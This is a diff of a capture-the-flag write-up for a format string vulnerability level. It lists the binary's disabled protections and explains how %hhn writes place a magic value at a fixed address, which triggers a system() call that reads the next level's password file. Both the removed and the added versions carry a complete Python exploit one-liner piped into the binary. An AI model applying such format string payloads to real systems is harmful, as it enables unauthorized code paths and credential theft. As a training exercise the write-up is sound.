@@ -1,6 +1,17 @@
 ## Level4 - Format String Vulnerability
 Binary reads 512 bytes, passes to printf(buffer) without validation. Must write 0x1025544 to address 0x8049810 to trigger system("/bin/cat /home/user/level5/.pass").
 
+### Settings
+GCC stack protector support:            Enabled
+Strict user copy checks:                Disabled
+Restrict /dev/mem access:               Enabled
+Restrict /dev/kmem access:              Enabled
+grsecurity / PaX: No GRKERNSEC
+Kernel Heap Hardening: No KERNHEAP
+System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
+
 ### Vulnerability
 - Function `p()`: printf(buffer) with user input (format string vulnerability)
 - Allows arbitrary memory reads/writes via format string specifiers
@@ -22,20 +33,11 @@ Use %hhn (1-byte writes) instead of %hn (2-byte writes) to keep payload small:
 [173 bytes: padding] > total 258, write %14$hn
 ```
 
-### Execution
-```bash
-python3 << 'EOF'
-import struct
-payload = (struct.pack('<I', 0x8049810) + struct.pack('<I', 0x8049811) +
-           struct.pack('<I', 0x8049812) + b'A'*56 + b'%12$hhn' + b'A'*17 +
-           b'%13$hhn' + b'A'*173 + b'%14$hn')
-import sys; sys.stdout.buffer.write(payload)
-EOF
- | /home/user/level4/level4
-```
-
 ### Key Insights
 - %hhn writes 1 byte (character count mod 256)
 - Character count must increase: 68 < 85 < 258 (no backward jumps)
 - Payload fits in 512-byte fgets buffer
 - All three writes execute successfully, magic value written, system() triggered
+
+### Execution
+python -c "import struct,sys;sys.stdout.write(struct.pack('<I',0x8049810)+struct.pack('<I',0x8049811)+struct.pack('<I',0x8049812)+'A'*56+'%12\$hhn'+'A'*17+'%13\$hhn'+'A'*173+'%14\$hn')" | /home/user/level4/level4
